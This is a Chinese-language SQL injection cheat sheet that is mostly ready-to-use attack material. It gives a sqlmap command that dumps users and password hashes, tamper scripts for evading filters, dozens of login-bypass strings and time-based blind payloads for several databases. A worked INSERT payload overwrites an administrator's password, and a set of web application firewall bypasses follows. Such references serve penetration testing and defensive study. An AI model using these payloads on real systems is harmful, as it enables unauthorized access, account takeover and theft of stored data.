# SQL 注入
一个SQL注入攻击由通过从客户端向应用程序输入数据的SQL查询的插入或“注入”组成

## 入口点侦测
侦测一个SQL注入的入口点
```
'
"
%27
" / %22
; / %3B
%%2727
%25%27
`+HERP
'||'DERP
'+'herp
' ' DERP
Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
transformed into U+0022 QUOTATION MARK (")
Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
transformed into U+0027 APOSTROPHE (')
Wildcard (*)
```



## SQL 注入 使用SQLmap
SQLmap的基础参数
```
sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
```

在用户代理/报头/参考页/Cookie中的自定义插入
```
python sqlmap.py -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
The injection is located at the '*'
```

通用篡改选项和篡改的列表
```
tamper=name_of_the_tamper
```

| Tamper | Description |
| --- | --- |
|apostrophemask.py | Replaces apostrophe character with its UTF-8 full width counterpart |
|apostrophenullencode.py | Replaces apostrophe character with its illegal double unicode counterpart|
|appendnullbyte.py | Appends encoded NULL byte character at the end of payload |
|base64encode.py | Base64 all characters in a given payload  |
|between.py | Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' |
|bluecoat.py | Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator  |
|chardoubleencode.py | Double url-encodes all characters in a given payload (not processing already encoded) |
|commalesslimit.py | Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'|
|commalessmid.py | Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'|
|concat2concatws.py | Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'|
|charencode.py | Url-encodes all characters in a given payload (not processing already encoded)  |
|charunicodeencode.py | Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)  |
|equaltolike.py | Replaces all occurances of operator equal ('=') with operator 'LIKE'  |
|escapequotes.py | Slash escape quotes (' and ") |
|greatest.py | Replaces greater than operator ('>') with 'GREATEST' counterpart |
|halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword  |
|ifnull2ifisnull.py | Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'|
|modsecurityversioned.py | Embraces complete query with versioned comment |
|modsecurityzeroversioned.py | Embraces complete query with zero-versioned comment |
|multiplespaces.py | Adds multiple spaces around SQL keywords |
|nonrecursivereplacement.py | Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace("SELECT", "")) filters|
|percentage.py | Adds a percentage sign ('%') infront of each character  |
|overlongutf8.py | Converts all characters in a given payload (not processing already encoded) |
|randomcase.py | Replaces each keyword character with random case value |
|randomcomments.py | Add random comments to SQL keywords|
|securesphere.py | Appends special crafted string|
|sp_password.py |  Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs |
|space2comment.py | Replaces space character (' ') with comments |
|space2dash.py | Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n') |
|space2hash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n') |
|space2morehash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n') |
|space2mssqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
|space2mssqlhash.py | Replaces space character (' ') with a pound character ('#') followed by a new line ('\n') |
|space2mysqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
|space2mysqldash.py | Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n') |
|space2plus.py |  Replaces space character (' ') with plus ('+')  |
|space2randomblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
|symboliclogical.py | Replaces AND and OR logical operators with their symbolic counterparts (&& and ||) |
|unionalltounion.py | Replaces UNION ALL SELECT with UNION SELECT |
|unmagicquotes.py | Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) |
|uppercase.py | Replaces each keyword character with upper case value 'INSERT'|
|varnish.py | Append a HTTP header 'X-originating-IP' |
|versionedkeywords.py | Encloses each non-function keyword with versioned MySQL comment |
|versionedmorekeywords.py | Encloses each keyword with versioned MySQL comment |
|xforwardedfor.py | Append a fake HTTP header 'X-Forwarded-For'|

## 认证旁路
```
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

## 基于时间的
```
SQLite : AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))      comment:   -- /**/
MySQL/MariaDB : AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))  //SHA1       comment: # -- /*!30100 MySQL code*/
MySQL/MariaDB : RLIKE SLEEP([SLEEPTIME])                                                  comment: # -- /*!30100 MySQL code*/
MySQL/MariaDB : OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))                            comment: # -- /*!30100 MySQL code*/
Oracle : AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])                 comment:   -- /**/
PostGreSQL : AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))                  comment:   -- /**/  
PostGreSQL : AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))    comment:   -- /**/
SQL Server : IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'                              comment:   --
```

## Polyglot 注入 (多语境)
```
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

## 插入语句 - ON DUPLICATE KEY UPDATE
ON DUPLICATE KEY UPDATE 关键词是用来告诉MySQL当应用程序试图插入表中已经存在的行时该怎么办。我们可以用它来改变管理员密码：
```
注入 使用 payload:
  attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" --

语句会看起来像这样:
INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" -- ", "bcrypt_hash_of_your_password_input");

这个语句将会为用户 “attacker_dummy@example.com”插入一行. 它也将为用户 “admin@example.com”插入一行.
因为这行已经存在, 关键次 ON DUPLICATE KEY UPDATE 告诉 MySQL 将已经存在的`密码`列更新为"bcrypt_hash_of_qwerty".

这之后, 我们就可以简单的使用用户名“admin@example.com” 和密码“qwerty”来验证啦!
```


## WAF 旁路

无空间 (%20) - bypass 使用空格替代
```
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```

无空白 - bypass使用comments
```
?id=1/*comment*/and/**/1=1/**/--
```

无空白 - bypass使用括号
```
?id=(1)and(1)=(1)--
```

无逗号 - bypass使用 OFFSET, FROM and JOIN
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```

使用关键字的黑名单 - bypass使用大写/小写
```
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```

关键字不区分大小写的黑名单 - bypass使用等效运算符
```
AND   -> &&
OR    -> ||
=     -> LIKE,REGEXP, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING
```

Information_schema.tables Alternative
```
select * from mysql.innodb_table_stats;
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |
| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |
...
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+

mysql> show tables in dvwa;
+----------------+
| Tables_in_dvwa |
+----------------+
| guestbook      |
| users          |
+----------------+

```

版本的选择
```
mysql> select @@innodb_version;
+------------------+
| @@innodb_version |
+------------------+
| 5.6.31           |
+------------------+

mysql> select @@version;
+-------------------------+
| @@version               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> mysql> select version();
+-------------------------+
| version()               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+
```



## 致谢 - 其他资源
* MySQL:
  - [PentestMonkey's mySQL injection cheat sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
  - [Reiners mySQL injection Filter Evasion Cheatsheet] (https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/)
  - [Alternative for Information_Schema.Tables in MySQL](https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/)
  - [The SQL Injection Knowledge base](https://websec.ca/kb/sql_injection)
* MSQQL:
  - [EvilSQL's Error/Union/Blind MSSQL Cheatsheet] (http://evilsql.com/main/page2.php)
  - [PentestMonkey's MSSQL SQLi injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
* ORACLE:
  - [PentestMonkey's Oracle SQLi Cheatsheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
* POSTGRESQL:
  - [PentestMonkey's Postgres SQLi Cheatsheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)
* Others
  - [Access SQLi Cheatsheet] (http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
  - [PentestMonkey's Ingres SQL Injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet)
  - [Pentestmonkey's DB2 SQL Injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)
  - [Pentestmonkey's Informix SQL Injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet)
  - [SQLite3 Injection Cheat sheet] (https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)
  - [Ruby on Rails (Active Record) SQL Injection Guide] (http://rails-sqli.org/)
  - [ForkBombers SQLMap Tamper Scripts Update](http://www.forkbombers.com/2016/07/sqlmap-tamper-scripts-update.html)
  - [SQLi in INSERT worse than SELECT](https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)


